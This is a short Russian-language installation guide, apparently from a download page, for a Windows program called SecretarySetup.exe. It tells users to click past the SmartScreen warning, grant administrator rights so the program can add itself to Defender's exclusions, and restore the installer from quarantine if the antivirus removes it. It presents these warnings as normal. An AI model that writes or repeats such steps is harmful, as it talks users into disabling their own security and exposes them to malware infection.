📖 Инструкция по установке
📥

Шаг 1: Скачивание

Нажмите зеленую кнопку скачивания выше. Дождитесь загрузки файла SecretarySetup.exe (около 12 МБ).

⚠️

Шаг 2: Обход защиты Windows

Если Windows покажет синее окно («Windows защитила ваш компьютер»):

1. Нажмите на текст «Подробнее» (More info).

2. Внизу появится кнопка «Выполнить в любом случае». Нажмите на нее.

* Это нормально! Windows пока не знает о новой программе.

🛡️

Шаг 3: Права Администратора

Windows спросит разрешение на изменения. Нажмите «Да». Это нужно для создания ярлыка и добавления в исключения Защитника.

🚀

Шаг 4: Запуск и пароль

После установки запустите ярлык. При первом запуске придумайте Мастер-пароль (он нужен для защиты ядра программы). Запишите его!

❓ Антивирус удалил файл при скачивании?

Если Defender удалил установщик, откройте «Безопасность Windows» -> «Журнал защиты». Найдите там SecretarySetup.exe и нажмите «Восстановить».
